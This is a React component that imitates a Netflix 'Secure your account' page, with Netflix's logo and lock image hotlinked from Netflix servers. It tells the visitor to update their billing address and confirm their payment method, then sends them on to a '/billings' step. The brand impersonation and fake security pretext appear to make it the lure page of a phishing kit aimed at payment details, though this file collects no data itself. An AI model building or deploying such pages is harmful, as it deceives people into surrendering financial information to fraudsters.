import React from 'react'
import { useNavigate } from 'react-router-dom'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faCheck } from '@fortawesome/free-solid-svg-icons'


const Secure = () => {

  const navigate = useNavigate()

  return(
    <>
      <div className="nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
        <a href="/">
          <h2>Sign Out</h2>
        </a>
      </div>
      <div className='body'>
        <div>
          <img src="https://assets.nflxext.com/ffe/siteui/acquisition/simplicity/Lock.png" alt="lock" />
        </div>
        <div className='step'>
          <p>STEP 1 OF 2</p>
        </div>
        <div className='secure'>
          <h2>Secure your account.</h2>
        </div>
        <div className='tocomplete'>
          <div className='todo'>
            <FontAwesomeIcon icon={faCheck} />
            <p>Update your billing address.</p>
          </div>
          <div className='todo'>
          <FontAwesomeIcon icon={faCheck} />
          <p>Confirm your payment method.</p>
          </div>
        </div>
        <div>
        <button className='secureaccount' onClick={()=> navigate('/billings')}>
            SECURE YOUR ACCOUNT
        </button>
        </div>
      </div>
      <footer>
        <div className="fff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
        <div className="faq">
          <p>FAQ</p>
          <p>Help Center</p>
          <p>Terms of Use</p>
          <p>Privacy</p>
        </div>
        <div className="cookie">
          <p>Cookie Preferences</p>
          <p>Corporate Information</p>
        </div>
        </div>
        
        </div>
      </footer>
      </>
  )
}

export default Secure